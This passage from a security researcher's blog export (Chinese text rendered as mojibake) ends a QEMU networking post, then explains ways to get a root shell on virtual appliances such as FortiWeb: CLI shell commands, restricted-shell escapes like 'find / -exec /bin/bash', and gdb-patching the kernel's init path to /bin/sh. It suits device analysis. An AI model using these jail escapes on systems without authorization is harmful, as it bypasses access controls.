<p>script å’Œ downscript ä¸¤ä¸ªé€‰é¡¹çš„ä½œç”¨æ˜¯å‘Šè¯‰ QEMU åœ¨å¯åŠ¨ç³»ç»Ÿçš„æ—¶å€™æ˜¯å¦è°ƒç”¨è„šæœ¬è‡ªåŠ¨é…ç½®ç½‘ç»œç¯å¢ƒï¼Œå¦‚æœè¿™ä¸¤ä¸ªé€‰é¡¹ä¸ºç©ºï¼Œé‚£ä¹ˆ QEMU å¯åŠ¨å’Œé€€å‡ºæ—¶ä¼šè‡ªåŠ¨é€‰æ‹©ç¬¬ä¸€ä¸ªä¸å­˜åœ¨çš„ tap æ¥å£(é€šå¸¸æ˜¯ tap0)ä¸ºå‚æ•°ï¼Œè°ƒç”¨è„šæœ¬ &#x2F;etc&#x2F;qemu-ifup å’Œ &#x2F;etc&#x2F;qemu-ifdownã€‚ç”±äºæˆ‘ä»¬å·²ç»é…ç½®å®Œæ¯•ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªå‚æ•°è®¾ç½®ä¸º no å³å¯ã€‚</p>
<p>ç­‰åˆ°é•œåƒ boot å®Œæ¯•ï¼Œåœ¨å‘½ä»¤è¡Œä¸­ ping ä¸€ä¸‹ç™¾åº¦ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-6.png"
                     
                ></p>
<p>è‡³æ­¤ç½‘ç»œé…ç½®æˆåŠŸã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a class="link"   href="https://blog.csdn.net/u014022631/article/details/53411557" >https://blog.csdn.net/u014022631/article/details/53411557<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://shadow-file.blogspot.com/2013/05/running-debian-mips-linux-in-qemu.html" >https://shadow-file.blogspot.com/2013/05/running-debian-mips-linux-in-qemu.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>ä¸€äº›è™šæ‹Ÿæœºè·å– shell çš„æ–¹æ³•</title>
    <url>/2021/05/12/vm_shell/</url>
    <content><![CDATA[<p>å‰ç«¯æ—¶é—´ç¢°åˆ°ä¸€äº›ç½‘ç»œè®¾å¤‡ï¼Œå®ƒä»¬å¯ä»¥ä»¥è™šæ‹Ÿæœºå½¢å¼è¿›è¡Œå®‰è£…éƒ¨ç½²ï¼Œåœ¨åˆ†ææ­¤ç±»è®¾å¤‡çš„æ—¶å€™ï¼Œè·å–ä¸€ä¸ª root shell ä¼šæ›´åŠ æ–¹ä¾¿ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†è®¾å¤‡é•œåƒä¸­éƒ½è®¾ç½®äº†è‡ªå®šä¹‰çš„ cli ä½œä¸º jailï¼Œé˜²æ­¢ç”¨æˆ·ç›´æ¥è®¿é—®åˆ° linux shï¼Œæé«˜è®¾å¤‡å®‰å…¨æ€§ã€‚ç°æ€»ç»“ä¸€äº›è·å–è™šæ‹Ÿæœºè®¾å¤‡ root shell çš„æ–¹æ³•ï¼Œåˆ†äº«ç»™å¤§å®¶ã€‚</p>
<span id="more"></span>

<h2 id="shell-ææƒ"><a href="#shell-ææƒ" class="headerlink" title="shell ææƒ"></a>shell ææƒ</h2><p>æŸäº›è®¾å¤‡æ²¡æœ‰å†…ç½®è‡ªå®šä¹‰çš„ cli ç¨‹åºï¼Œä½†æ˜¯å®ƒä»¬é»˜è®¤æä¾›çš„ shell æƒé™è¾ƒä½ï¼Œæ­¤æ—¶å¯ä»¥è€ƒè™‘é€šè¿‡æŸäº›å†å²æ¼æ´è¿›è¡Œææƒï¼Œè·å– root æƒé™ï¼Œä¾‹å¦‚å‰æ®µæ—¶é—´çˆ†å‡ºçš„ sudo å †æº¢å‡ºæ¼æ´ç­‰ï¼Œç”±äºè®¾å¤‡å†…æ ¸ç‰ˆæœ¬æ™®éä¸é«˜ï¼Œä¸€èˆ¬éƒ½å¯ä»¥æˆåŠŸææƒã€‚</p>
<h2 id="cli-è‡ªå¸¦çš„åŠŸèƒ½"><a href="#cli-è‡ªå¸¦çš„åŠŸèƒ½" class="headerlink" title="cli è‡ªå¸¦çš„åŠŸèƒ½"></a>cli è‡ªå¸¦çš„åŠŸèƒ½</h2><p>ä¸ºäº†æ›´æ–¹ä¾¿çš„ç»´æŠ¤è®¾å¤‡ï¼Œcli jail ä¸­å¯èƒ½ä¼šæ·»åŠ ä¸€äº›ç‰¹æ®Šçš„å‘½ä»¤ï¼Œé€šè¿‡æ‰§è¡Œè¿™äº›å‘½ä»¤å°±èƒ½è·å– linux shï¼Œä»¥ Citrix Netscaler ä¸ºä¾‹ï¼Œå…¶ cli æä¾›äº† shell å‘½ä»¤ï¼Œç›´æ¥æ‰§è¡Œå°±å¯ä»¥è·å– linux shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-1.png"
                     
                ></p>
<p>å¦å¤–ä¾‹å¦‚ check point Gatewayï¼Œå¯ä½¿ç”¨ set expert-password è®¾ç½®ä¸“å®¶æ¨¡å¼å¯†ç ï¼Œç„¶åç”¨ expert å‘½ä»¤è¿›å…¥ä¸“å®¶æ¨¡å¼ï¼Œæ‰€è°“ä¸“å®¶æ¨¡å¼å°±æ˜¯ linux root shellã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-2.png"
                     
                ></p>
<p>æ‰€ä»¥é‡åˆ°ä¸€æ¬¾æ–°è®¾å¤‡åº”è¯¥å…ˆæŸ¥çœ‹å…¶ cli å‘½ä»¤æ‰‹å†Œï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨èƒ½å¤Ÿç›´æ¥è·å– root shell çš„å‘½ä»¤ã€‚</p>
<h2 id="åˆ©ç”¨å†å²æ¼æ´è·å–-shell"><a href="#åˆ©ç”¨å†å²æ¼æ´è·å–-shell" class="headerlink" title="åˆ©ç”¨å†å²æ¼æ´è·å– shell"></a>åˆ©ç”¨å†å²æ¼æ´è·å– shell</h2><p>é€šè¿‡æŸ¥çœ‹å†å² CVE æˆ–å®˜æ–¹æ¼æ´é€šå‘Šä¿¡æ¯ï¼Œå¯ä»¥å‘ç°ä¸€äº› cli jail å­˜åœ¨å‘½ä»¤æ³¨å…¥&#x2F;é€ƒé€¸çš„é—®é¢˜ï¼Œé€šè¿‡åˆ©ç”¨è¿™äº›å†å²æ¼æ´å°±èƒ½æ‹¿åˆ° linux shellã€‚</p>
<p><a class="link"   href="https://repo.zenk-security.com/Conferences/HITB/D2T1%20-%20Felix%20Wilhelm%20-%20Attacking%20Next%20Generation%20Firewalls.pdf" >å‚è€ƒèµ„æ–™<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="è§£åŒ…ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿ"><a href="#è§£åŒ…ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="è§£åŒ…ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿ"></a>è§£åŒ…ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿ</h2><p>å‰æï¼šç£ç›˜æ–‡ä»¶æ²¡æœ‰åŠ å¯†</p>
<p>cli jail èƒŒåå¯¹åº”ç€æŸä¸ªç¨‹åºï¼Œé€šè¿‡è§£åŒ…æ–‡ä»¶ç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¿®æ”¹è¿™ä¸ª jail ç¨‹åºæˆ–è€…ç›´æ¥åœ¨åˆå§‹åŒ–è„šæœ¬ç­‰ä½ç½®æ·»åŠ ä»£ç ï¼Œä¾‹å¦‚å¯åŠ¨ telnet æˆ–è€…åå¼¹ shell æ¥å®ç°é€ƒé€¸ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ç³»ç»Ÿå¯èƒ½å¯¹ file system è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœå‘ç°æ–‡ä»¶è¢«ä¿®æ”¹åˆ™æ‹’ç»å¯åŠ¨ï¼Œæ­¤æ—¶æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆã€‚</p>
<ol>
<li>ä¿®æ”¹ vmtools ç›¸å…³æ–‡ä»¶ï¼Œä½äº &#x2F;etc&#x2F;vmware-tools ç›®å½•ä¸‹çš„ vmtools è„šæœ¬æ–‡ä»¶å±äºç¬¬ä¸‰æ–¹ä»£ç ï¼Œå‚å•†å¯èƒ½ä¸ä¼šå¯¹å®ƒä»¬è¿›è¡Œæ£€æŸ¥ã€‚</li>
<li>ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿæ£€æµ‹ç¨‹åºï¼Œè¿™ç§æ–¹å¼éœ€è¦å¯¹ç¨‹åºè¿›è¡Œé€†å‘åˆ†æï¼Œå°è¯•å®šä½å…·ä½“çš„æ£€æŸ¥é€»è¾‘ã€‚</li>
</ol>
<h2 id="rbash-é€ƒé€¸æ€è·¯"><a href="#rbash-é€ƒé€¸æ€è·¯" class="headerlink" title="rbash é€ƒé€¸æ€è·¯"></a>rbash é€ƒé€¸æ€è·¯</h2><p>æŸäº› cli jail ä¸­å¯ä½¿ç”¨éƒ¨åˆ†æ­£å¸¸çš„ linux å‘½ä»¤ï¼Œä¾‹å¦‚ findã€more ç­‰ï¼Œæ–¹ä¾¿ç”¨æˆ·æ“ä½œï¼Œå…¶ä¸­æŸäº› linux å‘½ä»¤å¯ç”¨äºé€ƒé€¸ï¼Œä¾‹å¦‚ find çš„ exec å‚æ•°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -exec /bin/bash \;</span><br></pre></td></tr></table></figure></div>

<p>more çš„ subshellï¼Œåœ¨äº¤äº’å¼ç•Œé¢ä½¿ç”¨æ„Ÿå¹å·æ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">catalpa@CataLpa:/$ cat /bin/bash | more</span><br><span class="line">ELFxxxxxxxx</span><br><span class="line">--More--    // press h</span><br><span class="line">Most commands optionally preceded by integer argument k.  Defaults in brackets.</span><br><span class="line">Star (*) indicates argument becomes new default.</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">&lt;space&gt;                 Display next k lines of text [current screen size]</span><br><span class="line">z                       Display next k lines of text [current screen size]*</span><br><span class="line">&lt;return&gt;                Display next k lines of text [1]*</span><br><span class="line">d or ctrl-D             Scroll k lines [current scroll size, initially 11]*</span><br><span class="line">q or Q or &lt;interrupt&gt;   Exit from more</span><br><span class="line">s                       Skip forward k lines of text [1]</span><br><span class="line">f                       Skip forward k screenfuls of text [1]</span><br><span class="line">b or ctrl-B             Skip backwards k screenfuls of text [1]</span><br><span class="line">&#x27;                       Go to place where previous search started</span><br><span class="line">=                       Display current line number</span><br><span class="line">/&lt;regular expression&gt;   Search for kth occurrence of regular expression [1]</span><br><span class="line">n                       Search for kth occurrence of last r.e [1]</span><br><span class="line">!&lt;cmd&gt; or :!&lt;cmd&gt;       Execute &lt;cmd&gt; in a subshell</span><br><span class="line">v                       Start up /usr/bin/vi at current line</span><br><span class="line">ctrl-L                  Redraw screen</span><br><span class="line">:n                      Go to kth next file [1]</span><br><span class="line">:p                      Go to kth previous file [1]</span><br><span class="line">:f                      Display current file name and line number</span><br><span class="line">.                       Repeat previous command</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">!uname -a</span><br><span class="line">Linux CataLpa 4.4.0-19041-Microsoft #488-Microsoft Mon Sep 01 13:43:00 PST 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure></div>

<p>less çš„ MISCELLANEOUS COMMANDSï¼Œå¯ä»¥ä½¿ç”¨ !command æˆ– |Xcommand ç­‰æ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                   MISCELLANEOUS COMMANDS</span><br><span class="line"></span><br><span class="line"> -&lt;flag&gt;              Toggle a command line option [see OPTIONS below].</span><br><span class="line"> --&lt;name&gt;             Toggle a command line option, by name.</span><br><span class="line"> _&lt;flag&gt;              Display the setting of a command line option.</span><br><span class="line"> __&lt;name&gt;             Display the setting of an option, by name.</span><br><span class="line"> +cmd                 Execute the less cmd each time a new file is examined.</span><br><span class="line"></span><br><span class="line"> !command             Execute the shell command with $SHELL.</span><br><span class="line"> |Xcommand            Pipe file between current pos &amp; mark X to shell command.</span><br><span class="line"> s file               Save input to a file.</span><br><span class="line"> v                    Edit the current file with $VISUAL or $EDITOR.</span><br><span class="line"> V                    Print version number of &quot;less&quot;.</span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure></div>

<p>è¿˜æœ‰ä¸€äº›æ–¹æ³•å¯å‚è€ƒ<a class="link"   href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" >æ­¤æ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<h2 id="è™šæ‹Ÿæœºè°ƒè¯•"><a href="#è™šæ‹Ÿæœºè°ƒè¯•" class="headerlink" title="è™šæ‹Ÿæœºè°ƒè¯•"></a>è™šæ‹Ÿæœºè°ƒè¯•</h2><p>blackhat DEVCORE å›¢é˜Ÿæˆå‘˜çš„è®®é¢˜ä¸­æåˆ°çš„ä¸€ç§æ–¹æ³•ã€‚é¦–å…ˆè¦å¤§æ¦‚äº†è§£ linux ç³»ç»Ÿçš„å¯åŠ¨å¼•å¯¼æµç¨‹ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒæ­¤<a class="link"   href="https://blog.csdn.net/star19830909/article/details/88235535" >æ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚ç®€å•æ¥è¯´ï¼ŒLinux å¯åŠ¨æ—¶ï¼Œä¸»è¦åšäº†ä»¥ä¸‹æ“ä½œ:</p>
<ol>
<li>BIOS è¿è¡Œï¼Œæ‰§è¡Œ POSTï¼Œç¡¬ä»¶è‡ªæ£€ã€‚</li>
<li>ç¡¬ä»¶è‡ªæ£€é€šè¿‡ï¼ŒBIOS åœ¨ç£ç›˜æŸ¥æ‰¾å¼•å¯¼è®°å½•ï¼Œå¹¶åŠ è½½åˆ°å†…å­˜æ‰§è¡Œ (MBR)ã€‚</li>
<li>å¼•å¯¼è®°å½•å¯åŠ¨å¼•å¯¼åŠ è½½å™¨ï¼Œå¸¸ç”¨çš„åŠ è½½å™¨åŒ…æ‹¬ GRUBã€GRUB2ã€LILO ç­‰ã€‚</li>
<li>å¼•å¯¼åŠ è½½å™¨åœ¨ç£ç›˜å¯»æ‰¾å†…æ ¸æ–‡ä»¶å¹¶è£…è½½åˆ°å†…å­˜ï¼Œå°†æ§åˆ¶æƒè½¬ç§»åˆ°å†…æ ¸ç»§ç»­æ‰§è¡Œã€‚</li>
<li>å†…æ ¸é€šå¸¸æ˜¯è‡ªè§£å‹æ–‡ä»¶ï¼Œæ–‡ä»¶åå¸¦æœ‰ vmlinuz å‰ç¼€ï¼Œå†…æ ¸è´Ÿè´£å®Œæˆå‰©ä½™çš„å¯åŠ¨æµç¨‹ã€‚</li>
</ol>
<p>å…³é”®åœ¨äº vmlinuz å†…æ ¸åˆå§‹åŒ–æ“ä½œä¸­ï¼Œè¯¦ç»†æµç¨‹å¯å‚è€ƒæ­¤<a class="link"   href="https://blog.csdn.net/zxygww/article/details/49154859" >æ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>åœ¨åˆå§‹åŒ–æµç¨‹ä¸­æœ€åä¸€æ­¥ï¼Œå†…æ ¸ä¼šæ‰§è¡Œ init_post å‡½æ•°ï¼Œæ­¤æ—¶å†…æ ¸åˆå§‹åŒ–æ¥è¿‘å°¾å£°ï¼Œæ­¤å‡½æ•°ä¸»è¦ç”¨äºå¯åŠ¨ç”¨æˆ·ç©ºé—´ä¸­çš„ init è¿›ç¨‹ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> noinline <span class="title function_">init_post</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    free_initmem();  </span><br><span class="line">    unlock_kernel();  </span><br><span class="line">    mark_rodata_ro();  </span><br><span class="line">    system_state = SYSTEM_RUNNING;  </span><br><span class="line">    numa_default_policy();  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sys_open((<span class="type">const</span> <span class="type">char</span> __user *) <span class="string">&quot;/dev/console&quot;</span>, O_RDWR, <span class="number">0</span>) &lt; <span class="number">0</span>)  </span><br><span class="line">        printk(KERN_WARNING <span class="string">&quot;Warning: unable to open an initial console.\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    (<span class="type">void</span>) sys_dup(<span class="number">0</span>);  </span><br><span class="line">    (<span class="type">void</span>) sys_dup(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (ramdisk_execute_command) &#123;  </span><br><span class="line">        run_init_process(ramdisk_execute_command);  </span><br><span class="line">        printk(KERN_WARNING <span class="string">&quot;Failed to execute %s\n&quot;</span>,  </span><br><span class="line">                ramdisk_execute_command);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/*  </span></span><br><span class="line"><span class="comment">     * We try each of these until one succeeds.  </span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     * The Bourne shell can be used instead of init if we are  </span></span><br><span class="line"><span class="comment">     * trying to recover a really broken machine.  </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">if</span> (execute_command) &#123;  </span><br><span class="line">        run_init_process(execute_command);  </span><br><span class="line">        printk(KERN_WARNING <span class="string">&quot;Failed to execute %s.  Attempting &quot;</span>  </span><br><span class="line">                    <span class="string">&quot;defaults...\n&quot;</span>, execute_command);  </span><br><span class="line">    &#125;  </span><br><span class="line">    run_init_process(<span class="string">&quot;/sbin/init&quot;</span>);  </span><br><span class="line">    run_init_process(<span class="string">&quot;/etc/init&quot;</span>);  </span><br><span class="line">    run_init_process(<span class="string">&quot;/bin/init&quot;</span>);  </span><br><span class="line">    run_init_process(<span class="string">&quot;/bin/sh&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    panic(<span class="string">&quot;No init found.  Try passing init= option to kernel.&quot;</span>);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨å‡½æ•°æœ«å°¾åŒ…å« 4 ä¸ª run_init_processï¼Œåˆ†åˆ«å°è¯•æ‰§è¡Œ &#x2F;sbin&#x2F;initã€&#x2F;etc&#x2F;initã€&#x2F;bin&#x2F;initã€&#x2F;bin&#x2F;shï¼Œé€šå¸¸æ–‡ä»¶ç³»ç»Ÿä¸­éƒ½ä¼šåŒ…å« &#x2F;sbin&#x2F;initï¼Œå®ƒä¼šä½œä¸ºç”¨æˆ·ç©ºé—´çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œå‰©ä½™çš„åˆå§‹åŒ–æ“ä½œã€‚</p>
<p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹ run_init_process çš„å‚æ•°ï¼Œä¾‹å¦‚å°† &#x2F;sbin&#x2F;init ä¿®æ”¹æˆ &#x2F;bin&#x2F;shï¼Œæˆ–è€…åŠ«æŒå†…æ ¸çš„æµç¨‹åˆ° run_init_process(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œå¯èƒ½å°±ä¼šå¾—åˆ°ä¸€ä¸ª linux shellã€‚</p>
<p>ä¸ºäº†å®ç°ä¸Šè¿°æ“ä½œï¼Œè¦è§£å†³å‡ ä¸ªé—®é¢˜ã€‚</p>
<p><strong>å¦‚ä½•å¯¹å†…æ ¸è¿›è¡Œ debug</strong></p>
<p>vmware workstation æä¾›äº†è™šæ‹Ÿæœºè°ƒè¯•æ¥å£ï¼Œå®˜æ–¹æ–‡æ¡£æŒ‡å‡ºåªéœ€è¦åœ¨è™šæ‹Ÿæœºçš„ vmx æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹é€‰é¡¹ï¼Œå³å¯åœ¨å¤–éƒ¨ä½¿ç”¨ gdb é™„åŠ åˆ°è™šæ‹Ÿæœºä¸Šï¼Œä»è€Œå®ç°å¯¹è™šæ‹Ÿæœºçš„è°ƒè¯•</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">debugStub.listen.guest64 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest64.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest64 = &quot;12345&quot;</span><br><span class="line">debugStub.listen.guest32 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest32.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest32 = &quot;12346&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>å¦‚ä½•å®šä½ init_post å‡½æ•°ä»£ç </strong></p>
<p>æŸäº›è®¾å¤‡ vmdk æœªåŠ å¯†ï¼Œå¯ä»¥ç›´æ¥ä»ä¸­è§£å‡º vmlinuz å†…æ ¸æ–‡ä»¶ï¼Œé€šè¿‡è§£å‹ vmdk æ–‡ä»¶è·å– vmlinuz å†…æ ¸ã€‚</p>
<p>è·å–å†…æ ¸ä¹‹åéœ€è¦è¿›ä¸€æ­¥å¤„ç†ï¼Œå°†æ ¼å¼è½¬æ¢ä¸º elf æ–¹ä¾¿åˆ†æï¼Œå·²ç»æœ‰å¤§ä½¬å¼€å‘äº†å·¥å…· <a class="link"   href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œç›´æ¥è½¬æ¢å³å¯ã€‚</p>
<p>ä¿®å¤çš„å†…æ ¸ç”¨ IDA åˆ†æï¼Œæœç´¢å­—ç¬¦ä¸²èƒ½å¤Ÿå®šä½ &#x2F;sbin&#x2F;initï¼Œäº¤å‰å¼•ç”¨è®°ä¸‹ init_post å‡½æ•°çš„åœ°å€ã€‚</p>
<p>å¦‚æœ vmdk æ— æ³•è§£å‡ºå†…æ ¸æ–‡ä»¶ï¼Œè¯·å‚è€ƒä¸‹æ–‡ã€‚</p>
<p><strong>ä¿®æ”¹å†…å­˜</strong></p>
<p>ä»¥ fortiweb è™šæ‹Ÿæœºä¸ºä¾‹ï¼Œé¦–å…ˆåœ¨ vmware ä¸­å¯¼å…¥ ovf æ–‡ä»¶ï¼Œå¦‚å›¾</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-3.png"
                     
                ></p>
<p>è™šæ‹Ÿæœºåº“ä¸­é€‰æ‹©å¯¼å…¥çš„è™šæ‹Ÿæœºï¼Œå³é”®æ‰“å¼€è™šæ‹Ÿæœºç›®å½•ï¼Œæ‰¾åˆ° .vmx é…ç½®æ–‡ä»¶ï¼Œç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ã€‚</p>
<p>åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ é…ç½®å¹¶ä¿å­˜</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">debugStub.listen.guest64 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest64.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest64 = &quot;12345&quot;</span><br><span class="line">debugStub.listen.guest32 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest32.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest32 = &quot;12346&quot;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨å®¿ä¸»æœºæ‰“å¼€ç»ˆç«¯ï¼Œå¼€å¯ gdbã€‚windows ä¸‹æ¨èä½¿ç”¨ wslï¼Œåœ¨ wsl ä¸­å¯åŠ¨ gdb å³å¯ã€‚</p>
<p>vmware å¯åŠ¨è™šæ‹Ÿæœºï¼ŒåŒæ—¶åœ¨ gdb ä¸­æ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote 0:12345</span><br></pre></td></tr></table></figure></div>

<p>æ³¨ï¼šé™„åŠ çš„æ—¶é—´è¦ä»”ç»†è°ƒæ•´ï¼Œå¤ªæ—©ä¼šç”±äºè°ƒè¯•æ¡¥çš„åŸå› å¯¼è‡´ gdb é™„åŠ å¤±è´¥ï¼Œå¤ªæ™šåˆä¼šé”™è¿‡ init_post é˜¶æ®µã€‚</p>
<p>å½“å‡ºç°ä»¥ä¸‹ä¿¡æ¯è¯´æ˜é™„åŠ æ­£ç¡®ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-4.png"
                     
                ></p>
<p>å¤§å¤šæ•°å†…æ ¸ä¸­åœ°å€éƒ½å½¢å¦‚ 0xffffffff8xxxxxxxã€‚é™„åŠ æˆåŠŸåæ ¹æ®ä¹‹å‰å¾—åˆ°çš„ init_post å‡½æ•°åœ°å€ä¸‹æ–­ç‚¹ï¼Œç„¶åç»§ç»­è¿è¡Œã€‚å¦‚æœæ— æ³•è·å¾—å†…æ ¸æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ä»å†…å­˜ä¸­æœç´¢ï¼Œæ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find 0xffffffff80000000, 0xffffffff81000000, &quot;/sbin/init&quot;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœæç¤º  Unable to access 16010 bytesï¼Œè¯´æ˜å¼€å§‹åœ°å€å¤ªå°ï¼Œå¯é€æ¸è°ƒæ•´ç›´åˆ°èƒ½å¤Ÿæ­£å¸¸æœç´¢ã€‚</p>
<p>å¦‚æœæœç´¢æ­£ç¡®ä¼šå‡ºç°ä»¥ä¸‹ä¿¡æ¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-5.png"
                     
                ></p>
<p>æŸ¥çœ‹æ­¤å¤„å†…å­˜å†…å®¹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x /10s 0xffffffff80f7df37</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-6.png"
                     
                ></p>
<p>ä¿®æ”¹å­—ç¬¦ä¸²ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set &#123;char [8]&#125; 0xffffffff80f7df37 = &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹å continue è®©å†…æ ¸ç»§ç»­æ‰§è¡Œï¼Œå¦‚æœæ“ä½œæ— è¯¯å°±å¾—åˆ°ä¸€ä¸ª linux shellã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-7.png"
                     
                ></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ç”±äºæˆ‘ä»¬ä¿®æ”¹äº†ç”¨æˆ·ç©ºé—´çš„ init ä¸º shï¼Œæ‰€ä»¥æ­¤æ—¶ç³»ç»Ÿæ˜¯æ²¡æœ‰å®Œå…¨åˆå§‹åŒ–çš„ï¼Œç°åœ¨å¯è¿›è¡Œå›ºä»¶å¯¼å‡ºæ“ä½œï¼Œä¹Ÿå¯ä»¥å°è¯•ä¿®æ”¹ vmtools æˆ–è€…å…¶ä»–æ“ä½œæ¥åœ¨ä¸‹ä¸€æ¬¡å¼€æœºæ—¶è·å–å®Œæ•´çš„ shellã€‚</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   href="https://repo.zenk-security.com/Conferences/HITB/D2T1%20-%20Felix%20Wilhelm%20-%20Attacking%20Next%20Generation%20Firewalls.pdf" >Attacking NextGeneration Firewalls<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" >Linux Restricted Shell Bypass<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/zxygww/article/details/49154859" >Linuxå¯åŠ¨æµç¨‹è§£æï¼šinit_postå‡½æ•°<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
